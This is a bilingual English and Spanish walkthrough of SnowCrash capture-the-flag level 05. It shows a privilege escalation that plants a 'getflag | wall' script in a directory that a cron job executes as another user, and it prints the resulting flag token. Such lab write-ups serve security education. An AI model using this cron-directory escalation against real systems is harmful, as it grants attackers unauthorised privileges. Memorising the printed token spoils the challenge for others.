# Flag 05

## Tools Used:

* `cat` command
* Basic knowledge of cron jobs
* Shell scripting (`sh`, `bash`, `ulimit`, `wall`)

## Process:

Upon logging into the `level05` account, a message appears indicating that the user has mail. Checking the mail reveals a cron job:

```bash
level05@SnowCrash:~$ echo $MAIL
/var/mail/level05

level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This shows that every 2 minutes, a script (`/usr/sbin/openarenaserver`) is executed as the `flag05` user.

Inspecting the script:

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

### Key observations:

1. The script runs any file placed inside `/opt/openarenaserver` with `flag05` privileges.
2. Files are executed with a limited CPU time (`ulimit -t 5`) and then deleted.

### Exploitation:

To exploit this, we place a simple script that calls `getflag` and uses `wall` to broadcast the result:

```bash
level05@SnowCrash:~$ echo 'getflag | wall' > /opt/openarenaserver/1
```

After waiting for the cron job to execute (maximum 2 minutes), the flag appears as a broadcast message:

```
Broadcast Message from flag05@Snow
        (somewhere) at 13:42 ...

Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

# Flag 05

## Herramientas Utilizadas:

* Comando `cat`
* Conocimientos básicos de cron jobs
* Scripting en Shell (`sh`, `bash`, `ulimit`, `wall`)

## Proceso:

Al iniciar sesión en la cuenta `level05`, se muestra un mensaje indicando que el usuario tiene correo. Al revisar el correo encontramos un cron job:

```bash
level05@SnowCrash:~$ echo $MAIL
/var/mail/level05

level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Este cron job ejecuta cada 2 minutos un script (`/usr/sbin/openarenaserver`) como usuario `flag05`.

Al inspeccionar el script:

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

### Observaciones clave:

1. El script ejecuta cualquier archivo colocado en `/opt/openarenaserver` con los privilegios de `flag05`.
2. Los archivos se ejecutan con un tiempo limitado de CPU y luego se eliminan.

### Explotación:

Para explotar esta vulnerabilidad, colocamos un script sencillo que llame a `getflag` y use `wall` para mostrar el resultado:

```bash
level05@SnowCrash:~$ echo 'getflag | wall' > /opt/openarenaserver/1
```

Después de esperar a que se ejecute el cron job (máximo 2 minutos), la flag aparece en un mensaje broadcast:

```
Broadcast Message from flag05@Snow
        (somewhere) at 13:42 ...

Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

## Scripts Used:

```bash
getflag | wall
```

## Flag:

```
viuaaale9huek52boumoomioc
```